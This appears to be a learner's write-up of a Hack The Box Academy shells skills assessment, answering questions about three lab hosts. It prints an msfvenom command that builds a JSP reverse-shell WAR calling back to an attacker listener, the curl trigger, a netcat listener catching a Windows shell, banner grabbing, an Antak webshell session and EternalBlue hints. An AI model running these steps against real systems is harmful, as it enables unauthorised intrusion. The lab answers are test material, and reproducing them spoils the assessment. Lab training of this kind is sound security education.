Q1. What is the hostname of Host-1? (Format: all lower case)


![](Attachments/Pasted%20image%2020260904160719.png)

![](Attachments/Pasted%20image%2020260904160809.png)

```
┌─[htb-student@skills-foothold]─[~]
└──╼ $msfvenom -p java/jsp_shell_reverse_tcp LHOST=172.16.1.5 LPORT=9000 -f war -o shell.war
Payload size: 1099 bytes
Final size of war file: 1099 bytes
Saved as: shell.war

```

```
─╼ $unzip -l shell.war
Archive:  shell.war
  Length      Date    Time    Name
---------  ---------- -----   ----
        0  2026-09-04 06:29   WEB-INF/
      264  2026-09-04 06:29   WEB-INF/web.xml
     1496  2026-09-04 06:29   jjokacwlvcfug.jsp
---------                     -------
     1760                     3 files

```

```
└──╼ $curl -v http://172.16.1.11:8080/shell/jjokacwlvcfug.jsp
*   Trying 172.16.1.11:8080...
* Connected to 172.16.1.11 (172.16.1.11) port 8080 (#0)
> GET /shell/jjokacwlvcfug.jsp HTTP/1.1
> Host: 172.16.1.11:8080
> User-Agent: curl/7.74.0
> Accept: */*
> 
* Mark bundle as not supporting multiuse
< HTTP/1.1 200 
< Set-Cookie: JSESSIONID=2582F16D2FA5908D11C13CCDD1C40F0A; Path=/shell; HttpOnly
< Content-Type: text/html;charset=UTF-8
< Content-Length: 6
< Date: Fri, 04 Sep 2026 10:36:09 GMT
< 






* Connection #0 to host 172.16.1.11 left intact

```

```
──╼ $nc -lvnp 9000
listening on [any] 9000 ...
connect to [172.16.1.5] from (UNKNOWN) [172.16.1.11] 49739
Microsoft Windows [Version 10.0.17763.2114]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>whoami
whoami
nt authority\local service

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>hostname
hostname
shells-winsvr

C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>^C

```

Q2.  Exploit the target and gain a shell session. Submit the name of the folder located in C:\Shares\ (Format: all lower case)

```
C:\Program Files (x86)\Apache Software Foundation\Tomcat 10.0>dir  C:\Shares\
dir  C:\Shares\
 Volume in drive C has no label.
 Volume Serial Number is 2683-3D37

 Directory of C:\Shares

09/22/2021  01:22 PM    <DIR>          .
09/22/2021  01:22 PM    <DIR>          ..
09/22/2021  01:24 PM    <DIR>          dev-share
               0 File(s)              0 bytes
               3 Dir(s)  26,685,423,616 bytes free

```

Q3. What distribution of Linux is running on Host-2? (Format: distro name, all lower case)

try ping sweep and banner grab the ip which you found

```
└──╼ $nc -nv 172.16.1.12 22
(UNKNOWN) [172.16.1.12] 22 (ssh) open
SSH-2.0-OpenSSH_8.2p1 Ubuntu-4ubuntu0.3
^C

```

Q4. What language is the shell written in that gets uploaded when using the 50064.rb exploit? 

copy 50064.rb and paste it in the msf exploit folder and relaod all then use it 





Q6. What is the hostname of Host-3?

```
Welcome to Antak - A Webshell which utilizes PowerShell
Use help for more details.
Use clear to clear the screen.
PS> whoami
iis apppool\defaultapppool

PS> hostname
SHELLS-WINBLUE
```

Q7. Exploit and gain a shell session with Host-3. Then submit the contents of C:\Users\Administrator\Desktop\Skills-flag.txt

use eternal blue psexec and you will get shell as system